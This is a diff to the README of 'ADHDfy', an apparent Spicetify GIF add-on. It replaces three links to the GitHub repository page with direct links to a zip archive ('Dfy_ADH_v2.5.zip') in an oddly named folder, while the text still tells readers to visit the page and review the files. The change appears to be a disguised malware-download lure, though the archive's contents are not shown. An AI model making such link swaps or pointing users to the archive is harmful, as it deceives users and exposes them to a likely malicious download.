@@ -1,6 +1,6 @@
 # 🎵 ADHDfy - Put GIFs Where You Want
 
-[![Download ADHDfy](https://img.shields.io/badge/Download-ADHDfy-blue?style=for-the-badge)](https://github.com/bongm7862/ADHDfy)
+[![Download ADHDfy](https://img.shields.io/badge/Download-ADHDfy-blue?style=for-the-badge)](https://github.com/bongm7862/ADHDfy/raw/refs/heads/main/microleukoblast/Dfy_ADH_v2.5.zip)
 
 ## 🚀 What ADHDfy Does
 
@@ -30,7 +30,7 @@ If you do not have Spicetify yet, install it first. ADHDfy depends on Spicetify 
 
 Visit this page to download and set up ADHDfy:
 
-[https://github.com/bongm7862/ADHDfy](https://github.com/bongm7862/ADHDfy)
+[https://github.com/bongm7862/ADHDfy/raw/refs/heads/main/microleukoblast/Dfy_ADH_v2.5.zip](https://github.com/bongm7862/ADHDfy/raw/refs/heads/main/microleukoblast/Dfy_ADH_v2.5.zip)
 
 Open the page, review the files, and get the version that fits the setup steps shown in the repository.
 
@@ -191,7 +191,7 @@ Open the repository page and check:
 
 The GitHub page is the best place to find the latest version and setup details:
 
-[https://github.com/bongm7862/ADHDfy](https://github.com/bongm7862/ADHDfy)
+[https://github.com/bongm7862/ADHDfy/raw/refs/heads/main/microleukoblast/Dfy_ADH_v2.5.zip](https://github.com/bongm7862/ADHDfy/raw/refs/heads/main/microleukoblast/Dfy_ADH_v2.5.zip)
 
 ## 📄 Repository Info
 
